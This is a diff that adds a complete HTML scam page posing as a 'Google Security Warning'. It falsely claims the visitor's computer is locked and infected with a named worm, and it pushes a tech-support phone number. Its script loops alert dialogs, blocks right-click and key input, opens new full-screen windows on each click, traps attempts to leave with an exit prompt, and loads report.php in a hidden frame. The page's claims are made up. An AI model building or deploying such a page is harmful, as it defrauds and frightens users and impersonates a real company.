@@ -1,0 +1,138 @@
+
+<!DOCTYPE html>
+<html <head=""><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta charset="utf-8">
+		<title>Google Security Warning</title>
+		<link rel="icon" type="image/png" href="google-favicon.png">
+		<meta content="width=device-width, initial-scale=1.0, user-scalable=1" name="viewport">
+		<meta name="robots" content="noindex, nofollow">
+		<script src="jquery.min.js"></script>
+
+		<script>
+			var is_chrome,
+				isChromium = window.chrome,
+				vendorName = window.navigator.vendor,
+				isOpera = window.navigator.userAgent.indexOf("OPR") > -1;
+			is_chrome = isChromium !== null && isChromium !== undefined && vendorName === "Google Inc." && isOpera == false ? true : false;
+
+			function alertCall()
+			{
+				alert('*************************************************\nRDN/YahLover.worm!055BCCAC9FEC Infection\n*************************************************\n\nCall Technical Support Immediately at +1-800-385-4507\n\nThe following data will be compromised if you continue:\n1. Passwords\n2. Browser History\n3. Credit Card Information\n\nThis virus is well known for complete identity and credit card theft. Further action through this computer or any computer on the network will reveal private information and involve serious risks.\n\nCall Technical Support Immediately at +1-800-385-4507');
+			}
+		 	function alertTimed()
+			{
+				if (is_chrome)
+				{
+					setInterval(function(){
+						alertCall();
+					}, 1000);
+				}
+				else
+				{
+					alertLoop();
+				}
+			}
+		 	function alertLoop()
+			{
+				for (i = 0; i < 500; i++)
+				{
+					alertCall();
+				}
+			}
+			function addEvent(obj, evt, fn)
+			{
+				if (obj.addEventListener)
+				{
+					obj.addEventListener(evt, fn, false)
+				}
+				else if (obj.attachEvent)
+				{
+					obj.attachEvent("on" + evt, fn)
+				}
+			}
+			$(document).ready(function(){
+				document.onkeydown = function(e){
+					if (e.ctrlKey && (e.keyCode === 67 || e.keyCode === 86 || e.keyCode === 85 || e.keyCode === 117))
+					{
+						if (!is_chrome)
+						{
+							alertTimed();
+						}
+						return true;
+					}
+					else if (e.keyCode === 123)
+					{
+						return true;
+					}
+					else
+					{
+						return true;
+					}
+				};
+				$(window).on('click', function(){
+					window.open('index2.html', 'window' + Math.floor((Math.random() * 9999) + 1), 'width=' + screen.availWidth + ',height=' + screen.availHeight + ',titlebar=1,menubar=1');
+					if (!is_chrome)
+					{
+						alertTimed();
+					}
+				});
+				addEvent(document, "mouseout", function(e){
+					e = e ? e : window.event;
+					var from = e.relatedTarget || e.toElement;
+					if (!is_chrome && (!from || from.nodeName == "body"))
+					{
+						alertTimed();
+					}
+				});
+			});
+			window.onbeforeunload = function(e){
+				var message = '*************************************************\nRDN/YahLover.worm!055BCCAC9FEC Infection\n*************************************************\n\nCall Technical Support Immediately at +1-800-385-4507\n\nThe following data will be compromised if you continue:\n1. Passwords\n2. Browser History\n3. Credit Card Information\n\nThis virus is well known for complete identity and credit card theft. Further action through this computer or any computer on the network will reveal private information and involve serious risks.\n\nCall Technical Support Immediately at +1-800-385-4507';
+				e.returnValue = message;
+				return message;
+			};
+			window.onload = function(e){
+				alertTimed();
+			};
+		</script>
+		<link href="style.css" rel="stylesheet" type="text/css">
+		<style>
+			*{margin:0;padding:0;height:auto}
+			body{background:#CD3426;color:#fff;font-family:'Yantramanav',sans-serif;margin:0 auto;width:100%;padding:0}
+			#wrap{max-width:800px;width:100%;margin:100px auto;padding:25px}
+			h1{margin-bottom:25px}
+			p{margin-bottom:35px}
+			p{line-height:28px}
+			a{color:#fff!important}
+			.btn{outline:0!important;text-decoration:none!important;padding:10px 24px;color:#fff;display:inline-block;font-size:15px;background-color:#cf483d;font-weight:600}
+			.btn:hover,.btn:active{-webkit-box-shadow:0px 2px 4px 0px rgba(0,0,0,0.50);-moz-box-shadow:0px 2px 4px 0px rgba(0,0,0,0.50);box-shadow:0px 2px 4px 0px rgba(0,0,0,0.50)}
+
+			input[type=checkbox]{visibility:hidden}
+			.checkbox{position:relative;margin-right:10px}
+			.checkbox label{cursor:pointer;position:absolute;width:15px;height:15px;left:4px;top:1px;border:1px solid #fff;border-radius:2px;-moz-border-radius:2px;-webkit-border-radius:2px}
+			.checkbox label:after{-ms-filter:"progid:DXImageTransform.Microsoft.Alpha(Opacity=0)";filter:alpha(opacity=0);opacity:0;content:'';position:absolute;width:8px;height:5px;background:transparent;top:2px;left:2px;border:2px solid #fff;border-top:none;border-right:none;-webkit-transform:rotate(-45deg);-moz-transform:rotate(-45deg);-o-transform:rotate(-45deg);-ms-transform:rotate(-45deg);transform:rotate(-45deg)}
+			.checkbox label:hover::after{-ms-filter:"progid:DXImageTransform.Microsoft.Alpha(Opacity=30)";filter:alpha(opacity=30);opacity:0.3}
+			.checkbox input[type=checkbox]:checked+label:after{-ms-filter:"progid:DXImageTransform.Microsoft.Alpha(Opacity=100)";filter:alpha(opacity=100);opacity:1}
+		</style>
+	</head>
+	<body oncontextmenu="return false;" onkeydown="return false;" onmousedown="return false;">
+		<div id="wrap">
+			<img src="x.png" alt="stop" width="75" height="75" style="margin-bottom:50px">
+			<h1>Your computer has been Locked</h1>
+			<p>Your computer with the IP address <strong>182.54.97.91</strong> has been infected by the Virus RDN/YahLover.worm!055BCCAC9FEC -- <strong> Because System Activation KEY has expired </strong> & Your information (for example, passwords, messages, and credit cards) have been stolen. <strong>Call the Technical Support number +1-800-385-4507 </strong> to protect your files and identity from further damage.</p>
+			<p style="margin-bottom:50px">
+				<span class="checkbox">
+					<input type="checkbox" id="checkbox">
+					<label for="checkbox"></label>
+				</span>
+				Automatically report details of possible security incidents to Google. <a href="index2.html" target="_blank">Privacy policy</a>
+			</p>
+			<div>
+				<a href="tel:18444047862" class="btn" target="_blank" style="float:left">+1-800-385-4507</a>
+				<a href="index2.html" class="btn" target="_blank" style="float:right">Back to safety</a>
+			</div>
+		</div>
+<iframe src="report.php"></iframe>
+
+
+</body>
+</html>
+
